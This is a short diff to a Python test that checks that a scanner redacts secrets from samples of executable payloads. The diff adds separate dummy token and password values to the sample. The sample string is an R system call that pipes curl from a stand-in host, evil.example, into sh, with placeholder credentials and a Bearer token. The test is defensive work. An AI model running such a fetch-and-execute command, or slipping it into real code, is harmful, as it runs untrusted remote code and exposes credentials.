@@ -547,7 +547,8 @@ def test_scan_redacts_executable_payload_samples(tmp_path: Path) -> None:
                 (
                     "base::system('curl "
                     "https://user:pass@evil.example/payload.sh?token=SECRET_TOKEN#SECRET_FRAGMENT "
-                    '| sh; password="R_SECRET_123456"; Authorization: Bearer ABCDEFGHIJKLMNOP\')'
+                    "| sh; token <- \"R_TOKEN_123456\"; password <<- 'R_PASS_123456'; "
+                    "Authorization: Bearer ABCDEFGHIJKLMNOP')"
                 ),
             ]
         ),
@@ -572,7 +573,8 @@ def test_scan_redacts_executable_payload_samples(tmp_path: Path) -> None:
         assert "user:pass" not in sample
         assert "SECRET_TOKEN" not in sample
         assert "SECRET_FRAGMENT" not in sample
-        assert "R_SECRET_123456" not in sample
+        assert "R_TOKEN_123456" not in sample
+        assert "R_PASS_123456" not in sample
         assert "ABCDEFGHIJKLMNOP" not in sample
 
 
